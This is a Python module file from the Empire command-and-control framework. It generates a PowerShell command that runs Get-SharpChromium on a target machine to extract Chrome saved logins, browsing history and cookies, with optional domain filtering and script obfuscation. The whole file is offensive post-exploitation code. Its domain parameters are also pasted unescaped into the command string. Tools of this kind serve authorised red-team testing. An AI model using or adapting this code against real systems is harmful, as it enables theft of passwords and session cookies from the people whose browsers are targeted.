import logging
from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message

log = logging.getLogger(__name__)


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = " Get-SharpChromium"

        # check type
        if params["Type"].lower() not in ["all", "logins", "history", "cookies"]:
            log.error("Invalid value of Type, use default value: all")
            params["Type"] = "all"
        script_end += " -Type " + params["Type"]
        # check domain
        if params["Domains"].lower() != "":
            if params["Type"].lower() != "cookies":
                log.error("Domains can only be used with Type cookies")
            else:
                script_end += " -Domains ("
                for domain in params["Domains"].split(","):
                    script_end += "'" + domain + "',"
                script_end = script_end[:-1]
                script_end += ")"

        outputf = params.get("OutputFunction", "Out-String")
        script_end += (
            f" | {outputf} | "
            + '%{$_ + "`n"};"`n'
            + str(module.name.split("/")[-1])
            + ' completed!"'
        )

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
